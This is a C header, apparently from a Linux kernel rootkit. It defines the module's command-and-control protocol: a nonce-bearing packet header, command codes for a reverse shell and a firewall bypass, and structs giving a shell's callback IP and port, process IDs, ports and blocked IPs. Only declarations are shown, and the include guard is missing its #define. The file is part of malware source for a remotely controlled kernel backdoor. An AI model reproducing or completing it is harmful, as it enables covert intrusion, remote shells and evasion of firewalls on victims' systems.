#ifndef __C2_H__
#include <linux/version.h>
#include <linux/kernel.h>

void c2_init(void);
void c2_exit(void);

#define CMD_REVERSE_SHELL   0
#define CMD_BYPASS_FIREWALL 1
#define CMD_MAX             2 

struct c2hdr {
    __u8 nonce[20];
    __u32 cmd;
};

struct c2opt_gen {
    __u32 field1;
    __u32 field2;
} __attribute__ ((__packed__));

struct c2opt_shell {
    __u32 ip;
    __u16 port;
} __attribute__ ((__packed__));

struct c2opt_pid {
    pid_t pid;
    __u32 flags;
} __attribute__ ((__packed__));

struct c2opt_port {
    __u32 port;
    __u32 flags;
} __attribute__ ((__packed__));

struct c2opt_block_ip {
    __u8 direction;
    __u32 ip;
} __attribute__ ((__packed__));

struct c2pkt {
    struct c2hdr hdr __attribute__ ((__packed__));
    __u8 *data;
} __attribute__ ((__packed__));
#endif /* __C2_H__ */
